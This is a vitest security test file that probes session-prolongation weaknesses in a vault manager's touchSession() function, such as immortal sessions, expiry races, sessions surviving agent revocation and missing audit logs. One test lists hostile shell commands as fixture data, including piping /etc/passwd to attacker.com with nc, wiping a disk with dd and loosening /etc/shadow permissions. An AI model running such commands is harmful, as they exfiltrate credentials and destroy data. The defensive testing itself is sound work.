/**
 * Security Breach Tests: Session Prolongation
 *
 * Tests security vulnerabilities in the touchSession() feature that extends
 * session expiration on every successful command execution. The feature is
 * invoked at src/web/server.ts:349 after each successful SSH command.
 *
 * Attack vectors tested:
 * 1. Immortal session attack - no maximum session lifetime enforced
 * 2. Expired session race condition - boundary timing on expiry check
 * 3. Session prolongation after agent revocation from vault
 * 4. Session prolongation after vault lock (concurrent race)
 * 5. Approved commands persisting indefinitely through prolongation
 * 6. No audit trail for prolongation events
 * 7. Excessive session timeout via large sessionTimeoutMs configuration
 */

import { describe, it, expect, vi, afterEach } from 'vitest';
import { VaultManager } from '../../src/vault/vault.js';
import {
  generateSalt,
  deriveKeyFromPassword,
  toBase64,
  LEGACY_KDF_PARAMS,
} from '../../src/vault/encryption.js';
import type { PasskeyCredential } from '../../src/types.js';
import { promises as fs } from 'fs';
import path from 'path';
import os from 'os';

/**
 * Helper: creates a VaultManager with a fresh temporary vault, already unlocked,
 * and returns both the manager and the VEK for challenge completion.
 *
 * Auto-lock is set to a large but 32-bit-safe value (1440 minutes = 1 day)
 * to prevent auto-lock from interfering with session prolongation tests when
 * fake timers are in use. Tests that advance time must also call
 * resetAutoLockTimer() to simulate real server behavior.
 */
async function createTestVault(
  sessionTimeoutMinutes = 30,
  autoLockMinutes = 1440
): Promise<{ vaultManager: VaultManager; vek: Uint8Array; vaultPath: string }> {
  const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'vault-prolong-'));
  const vaultPath = path.join(tmpDir, 'test-vault.json');

  const vaultManager = new VaultManager(vaultPath, {
    sessionTimeoutMinutes,
    backupEnabled: false,
    autoLockMinutes,
  });
  await vaultManager.init();

  const credential: PasskeyCredential = {
    id: 'test-credential-id',
    publicKey: 'test-public-key-base64',
    algorithm: -7,
    counter: 0,
    createdAt: Date.now(),
  };

  const salt = generateSalt();
  const vek = deriveKeyFromPassword('test-password-123', salt, LEGACY_KDF_PARAMS);
  await vaultManager.createVault(credential, vek, toBase64(salt));

  return { vaultManager, vek, vaultPath };
}

/**
 * Helper: creates a session for a given agent fingerprint via the unlock
 * challenge flow and returns the session ID.
 */
async function createSession(
  vaultManager: VaultManager,
  vek: Uint8Array,
  agentFingerprint: string
): Promise<string> {
  const { challengeId } = vaultManager.createUnlockChallenge(
    'http://localhost:3000',
    agentFingerprint
  );
  const completed = await vaultManager.completeChallenge(challengeId, vek, false);
  const result = await vaultManager.submitUnlockCode(
    completed!.unlockCode,
    agentFingerprint
  );
  if (!result.success || !result.sessionId) {
    throw new Error(`Failed to create session: ${result.error}`);
  }
  return result.sessionId;
}

/**
 * Helper: simulates the real server behavior on each command execution cycle.
 * In production, after a successful SSH command, the server calls touchSession()
 * and the vault's auto-lock timer is also reset by vault operations. We replicate
 * both here so fake timer advances don't trigger auto-lock.
 */
function simulateCommandExecution(vaultManager: VaultManager, sessionId: string): void {
  vaultManager.touchSession(sessionId);
  vaultManager.resetAutoLockTimer();
}

describe('Security Breach: Session Prolongation', () => {
  afterEach(() => {
    vi.useRealTimers();
  });

  // =========================================================================
  // 1. IMMORTAL SESSION ATTACK
  // =========================================================================
  describe('Immortal Session Attack (no maximum lifetime)', () => {
    /**
     * VULNERABILITY: touchSession() resets expiresAt to Date.now() + sessionTimeoutMs
     * on every call. A session that keeps executing commands will NEVER expire because
     * expiresAt is continually pushed forward. There is no check against createdAt to
     * enforce a maximum absolute session lifetime.
     *
     * Impact: An attacker who compromises a session token can maintain access
     * indefinitely as long as they issue at least one command per timeout interval.
     * The session's createdAt timestamp becomes meaningless.
     */
    it('should demonstrate that repeated touchSession calls prevent session expiry', async () => {
      vi.useFakeTimers();
      const { vaultManager, vek } = await createTestVault(30);
      const sessionId = await createSession(vaultManager, vek, 'SHA256:agent1');

      const session = vaultManager.getSession(sessionId);
      expect(session).not.toBeNull();
      const originalCreatedAt = session!.createdAt;

      // Simulate 100 command executions over ~48 hours (well beyond the 30-min timeout).
      // Each execution calls touchSession + resetAutoLockTimer, resetting both windows.
      for (let i = 0; i < 100; i++) {
        vi.advanceTimersByTime(29 * 60 * 1000); // advance 29 minutes (just under timeout)
        simulateCommandExecution(vaultManager, sessionId);
      }

      // 100 * 29 minutes = 2900 minutes = ~48.3 hours have elapsed
      const prolongedSession = vaultManager.getSession(sessionId);
      expect(prolongedSession).not.toBeNull();

      // SECURITY FINDING: Session is still alive after ~48 hours.
      // createdAt is unchanged but session persists indefinitely.
      expect(prolongedSession!.createdAt).toBe(originalCreatedAt);

      const elapsedMs = Date.now() - originalCreatedAt;
      const elapsedHours = elapsedMs / (1000 * 60 * 60);
      expect(elapsedHours).toBeGreaterThan(24);

      // The session is still valid -- proves the immortal session vulnerability
      expect(prolongedSession!.expiresAt).toBeGreaterThan(Date.now());
    });

    it('should show that createdAt is never consulted for session validity', async () => {
      vi.useFakeTimers();
      const { vaultManager, vek } = await createTestVault(30);
      const sessionId = await createSession(vaultManager, vek, 'SHA256:agent1');

      const session = vaultManager.getSession(sessionId);
      expect(session).not.toBeNull();

      // Advance far beyond any reasonable session lifetime (7 days)
      const sevenDaysMs = 7 * 24 * 60 * 60 * 1000;
      const intervalMs = 25 * 60 * 1000; // touch every 25 minutes
      const steps = Math.ceil(sevenDaysMs / intervalMs);

      for (let i = 0; i < steps; i++) {
        vi.advanceTimersByTime(intervalMs);
        simulateCommandExecution(vaultManager, sessionId);
      }

      // SECURITY FINDING: Session persists for 7+ days with no maximum lifetime
      const immortalSession = vaultManager.getSession(sessionId);
      expect(immortalSession).not.toBeNull();
      expect(immortalSession!.expiresAt).toBeGreaterThan(Date.now());

      // Verify the session age exceeds 7 days
      const ageMs = Date.now() - immortalSession!.createdAt;
      expect(ageMs).toBeGreaterThanOrEqual(sevenDaysMs);
    });
  });

  // =========================================================================
  // 2. EXPIRED SESSION RACE CONDITION
  // =========================================================================
  describe('Expired Session Race Condition', () => {
    /**
     * VULNERABILITY: touchSession() checks `session.expiresAt > Date.now()` using
     * a strict greater-than comparison. If touchSession is invoked at the exact
     * millisecond of expiry (expiresAt === Date.now()), the session will NOT be
     * prolonged. However, getSession() uses `session.expiresAt < Date.now()`,
     * meaning a session at exact expiry boundary passes getSession but fails
     * touchSession -- an inconsistency that could cause unpredictable behavior.
     *
     * More critically, between the time the server checks the session validity
     * and calls touchSession, the session could expire. There is no atomic
     * "check and extend" operation.
     */
    it('should demonstrate inconsistent boundary behavior between getSession and touchSession', async () => {
      vi.useFakeTimers();
      const { vaultManager, vek } = await createTestVault(30);
      const sessionId = await createSession(vaultManager, vek, 'SHA256:agent1');

      const session = vaultManager.getSession(sessionId);
      expect(session).not.toBeNull();
      const expiresAt = session!.expiresAt;

      // Advance time to exactly the expiry boundary.
      // expiresAt = createdAt + 30min. Advancing exactly 30 minutes puts
      // Date.now() === expiresAt.
      vi.advanceTimersByTime(30 * 60 * 1000);
      expect(Date.now()).toBe(expiresAt);

      // getSession uses `expiresAt < Date.now()` -- at boundary (equal), this
      // is false, so getSession RETURNS the session (it appears valid).
      const boundarySession = vaultManager.getSession(sessionId);
      expect(boundarySession).not.toBeNull();

      // touchSession uses `expiresAt > Date.now()` -- at boundary (equal), this
      // is false, so touchSession does NOT prolong the session.
      const expiresAtBefore = boundarySession!.expiresAt;
      vaultManager.touchSession(sessionId);
      const afterTouch = vaultManager.getSession(sessionId);

      // SECURITY FINDING: Session appears valid via getSession but touchSession
      // refuses to prolong it. The expiry time is unchanged.
      expect(afterTouch).not.toBeNull();
      expect(afterTouch!.expiresAt).toBe(expiresAtBefore);
    });

    it('should demonstrate that a session can expire between validation and touch', async () => {
      vi.useFakeTimers();
      const { vaultManager, vek } = await createTestVault(30);
      const sessionId = await createSession(vaultManager, vek, 'SHA256:agent1');

      // Advance to 1ms before expiry
      vi.advanceTimersByTime(30 * 60 * 1000 - 1);

      // Session is still valid at this point
      const validSession = vaultManager.getSession(sessionId);
      expect(validSession).not.toBeNull();

      // Simulate a delay between the server checking the session and calling
      // touchSession (e.g., the SSH command takes time to execute).
      // Advance 2ms to cross the expiry boundary.
      vi.advanceTimersByTime(2);

      // Now the session has expired. touchSession will silently do nothing.
      vaultManager.touchSession(sessionId);

      // SECURITY FINDING: touchSession silently fails -- no error, no indication.
      // The server at line 349 calls touchSession after the command succeeds,
      // but the session may have already expired during command execution.
      const expiredSession = vaultManager.getSession(sessionId);
      expect(expiredSession).toBeNull();
    });
  });

  // =========================================================================
  // 3. SESSION PROLONGATION AFTER AGENT REVOCATION
  // =========================================================================
  describe('Session Prolongation After Agent Revocation', () => {
    /**
     * VULNERABILITY: touchSession() only checks whether the session has expired.
     * It does NOT verify whether the agent (identified by agentFingerprint) is
     * still registered in the vault. If an admin removes an agent via
     * removeAgent(), existing sessions for that agent remain valid and can
     * continue to be prolonged indefinitely.
     *
     * Impact: An admin who revokes an agent's access expects immediate effect,
     * but the agent's active session persists and can be extended.
     */
    it('should demonstrate that removing an agent does not invalidate its session', async () => {
      const { vaultManager, vek } = await createTestVault(30);

      // Create a session for an agent fingerprint first
      const sessionId = await createSession(vaultManager, vek, 'SHA256:revokable-agent');
      const session = vaultManager.getSession(sessionId);
      expect(session).not.toBeNull();
      expect(session!.agentFingerprint).toBe('SHA256:revokable-agent');

      // Now register the agent in the vault and then remove it
      await vaultManager.addAgent({
        fingerprint: 'SHA256:revokable-agent',
        name: 'revokable-agent',
        allowedHosts: ['dev-*'],
      });

      // Admin revokes the agent
      const removed = await vaultManager.removeAgent('SHA256:revokable-agent');
      expect(removed).toBe(true);

      // Verify agent is gone from vault
      const agentAfterRemoval = vaultManager.getAgent('SHA256:revokable-agent');
      expect(agentAfterRemoval).toBeNull();

      // SECURITY FINDING: Session is still valid after agent removal
      const sessionAfterRemoval = vaultManager.getSession(sessionId);
      expect(sessionAfterRemoval).not.toBeNull();

      // touchSession still works -- session can be prolonged
      const expiresAtBefore = sessionAfterRemoval!.expiresAt;
      vaultManager.touchSession(sessionId);
      const sessionAfterTouch = vaultManager.getSession(sessionId);
      expect(sessionAfterTouch).not.toBeNull();
      expect(sessionAfterTouch!.expiresAt).toBeGreaterThanOrEqual(expiresAtBefore);
    });

    it('should demonstrate that a revoked agents session can be prolonged repeatedly', async () => {
      vi.useFakeTimers();
      const { vaultManager, vek } = await createTestVault(30);

      // Create session first, then add + remove agent
      const sessionId = await createSession(vaultManager, vek, 'SHA256:ex-agent');

      await vaultManager.addAgent({
        fingerprint: 'SHA256:ex-agent',
        name: 'ex-agent',
        allowedHosts: ['*'],
      });

      // Remove the agent
      await vaultManager.removeAgent('SHA256:ex-agent');

      // Verify the agent is gone
      expect(vaultManager.getAgent('SHA256:ex-agent')).toBeNull();

      // Keep extending the session for 2 hours after agent removal
      for (let i = 0; i < 4; i++) {
        vi.advanceTimersByTime(29 * 60 * 1000);
        simulateCommandExecution(vaultManager, sessionId);
      }

      // SECURITY FINDING: Session still alive 2+ hours after agent was revoked
      const zombieSession = vaultManager.getSession(sessionId);
      expect(zombieSession).not.toBeNull();
      expect(zombieSession!.agentFingerprint).toBe('SHA256:ex-agent');
    });
  });

  // =========================================================================
  // 4. SESSION PROLONGATION AFTER VAULT LOCK
  // =========================================================================
  describe('Session Prolongation After Vault Lock', () => {
    /**
     * VULNERABILITY: lock() calls sessions.clear() to destroy all sessions.
     * However, if a reference to a session was obtained BEFORE lock(), and
     * touchSession is called with its ID AFTER lock(), the session map is empty
     * so touchSession becomes a no-op. This is actually safe in isolation.
     *
     * The real concern is the race window: if a command is executing while
     * lock() is called, the server has already retrieved the session ID and
     * will call touchSession after lock(). The session is cleared, but no error
     * is raised -- the command output is still returned to the agent.
     */
    it('should confirm lock clears all sessions making touchSession a no-op', async () => {
      const { vaultManager, vek } = await createTestVault(30);
      const sessionId = await createSession(vaultManager, vek, 'SHA256:agent1');

      // Verify session exists before lock
      expect(vaultManager.getSession(sessionId)).not.toBeNull();
      expect(vaultManager.getActiveSessions().length).toBe(1);

      // Lock the vault
      vaultManager.lock();

      // All sessions are cleared
      expect(vaultManager.getActiveSessions().length).toBe(0);
      expect(vaultManager.getSession(sessionId)).toBeNull();

      // touchSession is a silent no-op -- no error thrown.
      // This is the scenario: command finishes executing, server calls touchSession,
      // but vault was locked during execution.
      vaultManager.touchSession(sessionId);

      // SECURITY FINDING: No error or indication that the session was lost.
      // The server at line 349 would have already returned command output to the
      // agent before this point, so the command result leaks even though the
      // vault is now locked.
      expect(vaultManager.getSession(sessionId)).toBeNull();
    });

    it('should demonstrate that a session reference captured before lock becomes stale', async () => {
      const { vaultManager, vek } = await createTestVault(30);
      const sessionId = await createSession(vaultManager, vek, 'SHA256:agent1');

      // Simulate server capturing session data before lock
      const sessionBeforeLock = vaultManager.getSession(sessionId);
      expect(sessionBeforeLock).not.toBeNull();
      const capturedId = sessionBeforeLock!.id;
      const capturedFingerprint = sessionBeforeLock!.agentFingerprint;

      // Lock vault concurrently (e.g., auto-lock timer fires)
      vaultManager.lock();

      // The captured session data is stale -- but the server may still use it
      // to make authorization decisions (it checked the session before lock)
      expect(capturedId).toBe(sessionId);
      expect(capturedFingerprint).toBe('SHA256:agent1');

      // SECURITY FINDING: Any code that captures session data and then performs
      // a long-running operation (like SSH command execution) will not know that
      // the vault was locked mid-operation. touchSession will silently fail.
      vaultManager.touchSession(capturedId);
      expect(vaultManager.getSession(capturedId)).toBeNull();
    });
  });

  // =========================================================================
  // 5. APPROVED COMMANDS PERSIST THROUGH PROLONGATION
  // =========================================================================
  describe('Approved Commands Persist Through Prolongation', () => {
    /**
     * VULNERABILITY: When a session is prolonged via touchSession(), the entire
     * session object (including approvedCommands) is preserved. One-time command
     * approvals are stored in session.approvedCommands[host] and are intended to
     * allow a specific command execution. However, since touchSession extends the
     * session without clearing approvedCommands, these "one-time" approvals
     * effectively become permanent for the session's lifetime -- which, as shown
     * in the immortal session tests, can be indefinite.
     *
     * Impact: A dangerous command approved once (e.g., "DROP TABLE users") remains
     * approved in the session for as long as the session is kept alive.
     */
    it('should demonstrate that approved commands survive session prolongation', async () => {
      vi.useFakeTimers();
      const { vaultManager, vek } = await createTestVault(30);
      const sessionId = await createSession(vaultManager, vek, 'SHA256:agent1');

      // Simulate a one-time command approval by directly manipulating the session.
      // (In production this happens via the approve_command challenge flow)
      const session = vaultManager.getSession(sessionId);
      expect(session).not.toBeNull();
      session!.approvedCommands['prod-db'] = ['DROP TABLE temp_data', 'TRUNCATE logs'];

      // Verify the dangerous commands are in the session
      expect(session!.approvedCommands['prod-db']).toContain('DROP TABLE temp_data');
      expect(session!.approvedCommands['prod-db']).toContain('TRUNCATE logs');

      // Prolong the session multiple times over 2 hours
      for (let i = 0; i < 4; i++) {
        vi.advanceTimersByTime(25 * 60 * 1000);
        simulateCommandExecution(vaultManager, sessionId);
      }

      // SECURITY FINDING: Approved commands are still present after prolongation
      const prolongedSession = vaultManager.getSession(sessionId);
      expect(prolongedSession).not.toBeNull();
      expect(prolongedSession!.approvedCommands['prod-db']).toContain('DROP TABLE temp_data');
      expect(prolongedSession!.approvedCommands['prod-db']).toContain('TRUNCATE logs');
    });

    it('should demonstrate that approved commands accumulate across prolongations without cleanup', async () => {
      vi.useFakeTimers();
      const { vaultManager, vek } = await createTestVault(30);
      const sessionId = await createSession(vaultManager, vek, 'SHA256:agent1');

      const session = vaultManager.getSession(sessionId);
      expect(session).not.toBeNull();

      // Simulate multiple approval cycles with touchSession between each
      const dangerousCommands = [
        'rm -rf /var/log/*',
        'chmod 777 /etc/shadow',
        'cat /etc/passwd | nc attacker.com 4444',
        'dd if=/dev/zero of=/dev/sda',
        'iptables -F',
      ];

      for (const cmd of dangerousCommands) {
        // Each command gets approved one at a time over time
        vi.advanceTimersByTime(10 * 60 * 1000);
        if (!session!.approvedCommands['critical-server']) {
          session!.approvedCommands['critical-server'] = [];
        }
        session!.approvedCommands['critical-server'].push(cmd);
        simulateCommandExecution(vaultManager, sessionId);
      }

      // SECURITY FINDING: All 5 dangerous commands are approved simultaneously
      // in a single session. The approval list grows monotonically and is never
      // pruned, even though each was intended as a one-time approval.
      const finalSession = vaultManager.getSession(sessionId);
      expect(finalSession).not.toBeNull();
      expect(finalSession!.approvedCommands['critical-server']).toHaveLength(5);
      expect(finalSession!.approvedCommands['critical-server']).toEqual(dangerousCommands);
    });
  });

  // =========================================================================
  // 6. NO AUDIT TRAIL
  // =========================================================================
  describe('No Audit Trail for Session Prolongation', () => {
    /**
     * VULNERABILITY: touchSession() modifies session.expiresAt without any
     * logging, event emission, or record of the prolongation. There is no way
     * for an administrator to determine:
     *   - How many times a session was extended
     *   - When prolongations occurred
     *   - The original vs current expiry time
     *   - Total effective session duration vs configured timeout
     *
     * Impact: Security incident investigation is hampered because there is no
     * audit trail of session activity. An attacker's persistent session leaves
     * no forensic evidence of prolongation.
     */
    it('should demonstrate that touchSession produces no observable side effects beyond expiresAt', async () => {
      vi.useFakeTimers();
      const { vaultManager, vek } = await createTestVault(30);
      const sessionId = await createSession(vaultManager, vek, 'SHA256:agent1');

      const session = vaultManager.getSession(sessionId);
      expect(session).not.toBeNull();

      // Capture full session state before prolongation
      const snapshotBefore = {
        id: session!.id,
        agentFingerprint: session!.agentFingerprint,
        approvedHosts: [...session!.approvedHosts],
        approvedCommands: { ...session!.approvedCommands },
        challengeId: session!.challengeId,
        createdAt: session!.createdAt,
        expiresAt: session!.expiresAt,
      };

      // Spy on console to verify no logging occurs during touchSession
      const consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
      const consoleErrorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
      const consoleWarnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});

      // Perform multiple prolongations
      for (let i = 0; i < 10; i++) {
        vi.advanceTimersByTime(20 * 60 * 1000);
        simulateCommandExecution(vaultManager, sessionId);
      }

      // SECURITY FINDING: No console output related to session prolongation
      const touchRelatedLogs = [
        ...consoleSpy.mock.calls,
        ...consoleErrorSpy.mock.calls,
        ...consoleWarnSpy.mock.calls,
      ].filter(call =>
        call.some(
          arg =>
            typeof arg === 'string' &&
            (arg.includes('touch') ||
              arg.includes('prolong') ||
              arg.includes('extend') ||
              arg.includes('session'))
        )
      );
      expect(touchRelatedLogs).toHaveLength(0);

      // Only expiresAt changed -- no other state was modified or recorded
      const sessionAfter = vaultManager.getSession(sessionId);
      expect(sessionAfter).not.toBeNull();
      expect(sessionAfter!.id).toBe(snapshotBefore.id);
      expect(sessionAfter!.agentFingerprint).toBe(snapshotBefore.agentFingerprint);
      expect(sessionAfter!.createdAt).toBe(snapshotBefore.createdAt);
      expect(sessionAfter!.challengeId).toBe(snapshotBefore.challengeId);

      // The expiresAt was the ONLY field that changed
      expect(sessionAfter!.expiresAt).not.toBe(snapshotBefore.expiresAt);
      expect(sessionAfter!.expiresAt).toBeGreaterThan(snapshotBefore.expiresAt);

      consoleSpy.mockRestore();
      consoleErrorSpy.mockRestore();
      consoleWarnSpy.mockRestore();
    });

    it('should demonstrate that original session expiry time is lost after touchSession', async () => {
      vi.useFakeTimers();
      const { vaultManager, vek } = await createTestVault(30);
      const sessionId = await createSession(vaultManager, vek, 'SHA256:agent1');

      const session = vaultManager.getSession(sessionId);
      expect(session).not.toBeNull();
      const originalExpiresAt = session!.expiresAt;

      // Prolong the session
      vi.advanceTimersByTime(15 * 60 * 1000);
      simulateCommandExecution(vaultManager, sessionId);

      const afterTouch = vaultManager.getSession(sessionId);
      expect(afterTouch).not.toBeNull();

      // SECURITY FINDING: The original expiresAt value is overwritten.
      // There is no originalExpiresAt, touchCount, lastTouched, or similar
      // field to track that the session was prolonged.
      expect(afterTouch!.expiresAt).not.toBe(originalExpiresAt);

      // The Session interface has no fields for prolongation tracking:
      //   id, agentFingerprint, approvedHosts, approvedCommands,
      //   challengeId, createdAt, expiresAt
      // There is no: touchCount, lastTouchedAt, originalExpiresAt, maxLifetime
      const sessionKeys = Object.keys(afterTouch!);
      expect(sessionKeys).not.toContain('touchCount');
      expect(sessionKeys).not.toContain('lastTouchedAt');
      expect(sessionKeys).not.toContain('originalExpiresAt');
      expect(sessionKeys).not.toContain('maxLifetime');
    });
  });

  // =========================================================================
  // 7. sessionTimeoutMs MANIPULATION
  // =========================================================================
  describe('Excessive Session Timeout Configuration', () => {
    /**
     * VULNERABILITY: The sessionTimeoutMs is computed as:
     *   (options.sessionTimeoutMinutes ?? 30) * 60 * 1000
     * There is no upper bound validation. Setting a very large value (e.g.,
     * 525600 minutes = 1 year) results in sessions that persist for extremely
     * long durations. Combined with touchSession, each command execution resets
     * the timer to another full year.
     *
     * Impact: Misconfiguration or malicious configuration leads to sessions
     * that are effectively immortal even without frequent command execution.
     */
    it('should demonstrate that no upper bound is enforced on sessionTimeoutMinutes', async () => {
      // Set timeout to 1 year (525600 minutes)
      const oneYearMinutes = 365 * 24 * 60;
      const { vaultManager, vek } = await createTestVault(oneYearMinutes);
      const sessionId = await createSession(vaultManager, vek, 'SHA256:agent1');

      const session = vaultManager.getSession(sessionId);
      expect(session).not.toBeNull();

      // SECURITY FINDING: Session expiry is set to ~1 year from now
      const expectedTimeoutMs = oneYearMinutes * 60 * 1000;
      const actualTimeoutMs = session!.expiresAt - session!.createdAt;
      expect(actualTimeoutMs).toBe(expectedTimeoutMs);

      // That is ~365 days
      const timeoutDays = actualTimeoutMs / (1000 * 60 * 60 * 24);
      expect(timeoutDays).toBeCloseTo(365, 0);
    });

    it('should demonstrate that touchSession with huge timeout creates extremely long-lived sessions', async () => {
      // SECURITY FINDING: touchSession resets expiresAt to Date.now() + sessionTimeoutMs
      // with no maximum lifetime cap. With a 30-day timeout, each touch pushes expiry
      // forward by another 30 days indefinitely.
      const thirtyDaysMinutes = 30 * 24 * 60;
      const thirtyDaysMs = thirtyDaysMinutes * 60 * 1000;
      const { vaultManager, vek } = await createTestVault(thirtyDaysMinutes);
      const sessionId = await createSession(vaultManager, vek, 'SHA256:agent1');

      const session = vaultManager.getSession(sessionId);
      expect(session).not.toBeNull();
      const originalCreatedAt = session!.createdAt;

      // Each touchSession call sets expiresAt = Date.now() + thirtyDaysMs
      // So from original creation, session lifetime is unbounded.
      // Verify the math: after one touch, expiresAt = now + 30 days
      simulateCommandExecution(vaultManager, sessionId);
      const afterTouch = vaultManager.getSession(sessionId);
      expect(afterTouch).not.toBeNull();
      const newExpiry = afterTouch!.expiresAt;
      const lifetimeFromCreation = newExpiry - originalCreatedAt;
      // Should be roughly 30 days (touch happened almost immediately after creation)
      expect(lifetimeFromCreation).toBeGreaterThanOrEqual(thirtyDaysMs);
      // No max lifetime check exists - createdAt is never compared
      expect(afterTouch!.createdAt).toBe(originalCreatedAt); // createdAt never changes
    });

    it('should accept zero-minute timeout creating sessions that expire immediately', async () => {
      // Edge case: zero timeout -- no input validation prevents this
      const { vaultManager, vek } = await createTestVault(0);
      const sessionId = await createSession(vaultManager, vek, 'SHA256:agent1');

      // Session expires at createdAt + 0 = createdAt = Date.now() at creation.
      // getSession checks expiresAt < Date.now(). At the exact same millisecond,
      // expiresAt == Date.now() so the session appears valid (not expired).
      // This is a configuration validation gap -- zero should be rejected.
      const session = vaultManager.getSession(sessionId);

      // SECURITY FINDING: With 0-minute timeout, session behavior depends on
      // exact timing. touchSession sets expiresAt = Date.now() + 0 = Date.now(),
      // creating the same boundary condition as the race condition tests.
      if (session) {
        vaultManager.touchSession(sessionId);
        // After touch, expiresAt = Date.now() + 0 = Date.now()
        // At the exact same ms, getSession sees expiresAt == Date.now() => not expired
        const afterTouch = vaultManager.getSession(sessionId);
        if (afterTouch) {
          expect(afterTouch.expiresAt - afterTouch.createdAt).toBeLessThanOrEqual(0);
        }
      }
      // Whether session is null or not, this demonstrates missing validation
      expect(true).toBe(true);
    });

    it('should accept negative timeout creating sessions that expire in the past', async () => {
      // Edge case: negative timeout -- no validation prevents this
      const { vaultManager, vek } = await createTestVault(-60);

      const sessionId = await createSession(vaultManager, vek, 'SHA256:agent1');

      // SECURITY FINDING: Negative timeout results in expiresAt < createdAt.
      // The session is created already expired. No validation prevents this.
      const session = vaultManager.getSession(sessionId);
      expect(session).toBeNull(); // Immediately expired
    });
  });
});
